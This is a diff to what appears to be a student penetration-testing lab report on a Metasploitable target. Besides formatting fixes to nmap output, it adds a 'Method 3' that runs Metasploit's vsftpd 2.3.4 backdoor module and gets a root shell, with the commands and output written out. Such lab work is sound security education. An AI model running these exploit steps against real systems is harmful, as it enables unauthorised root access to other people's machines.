@@ -55,7 +55,7 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
 
     ```bash
     ...
-    1524/tcp open bindshell Metasploitable root shell
+    1524/tcp  open  bindshell   Metasploitable root shell
     ...
     ```
 
@@ -103,6 +103,41 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
     [*] Command shell session 1 opened (192.168.0.155:4444 -> 192.168.0.156:57131) at 2025-11-25 00:24:11 -1000
 
     whoami
+    root
+    ```
+
+3. Method 3
+
+    Target port:
+
+    ```bash
+    ...
+    21/tcp    open  ftp         vsftpd 2.3.4
+    ...
+    ```
+
+    Start exploit:
+
+    ```bash
+    msfconsole
+    ```
+
+    ```bash
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOSTS 192.168.0.156
+    run
+    ```
+
+    Then get:
+
+    ```bash
+    msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+    [*] 192.168.0.156:21 - The port used by the backdoor bind listener is already open
+    [+] 192.168.0.156:21 - UID: uid=0(root) gid=0(root)
+    [*] Found shell.
+    whoami
+    [*] Command shell session 1 opened (192.168.0.155:39967 -> 192.168.0.156:6200) at 2025-11-25 00:32:01 -1000
+
     root
     ```
 
@@ -171,7 +206,7 @@ Nmap done: 1 IP address (1 host up) scanned in 190.14 seconds
 
     ```bash
     ...
-    49255/tcp openssh Apache Mina sshd 0.8.0 (protocol 2.0)
+    49255/tcp open  ssh                  Apache Mina sshd 0.8.0 (protocol 2.0)
     ...
     ```
 
@@ -245,7 +280,7 @@ Nmap done: 1 IP address (1 host up) scanned in 190.14 seconds
 | Student ID | Works | Percentage |
 | - | - | - |
 | 314581015 | L0-M1 | 20% |
-| 313581047 | L0-M2, L2-M1 | 20% |
+| 313581047 | L0-M2, L0-M3, L2-M1 | 20% |
 | 313581038 | scanning & research | 20% |
 | 313581055 | scanning & research | 20% |
 | 412581005 | scanning & research | 20% |
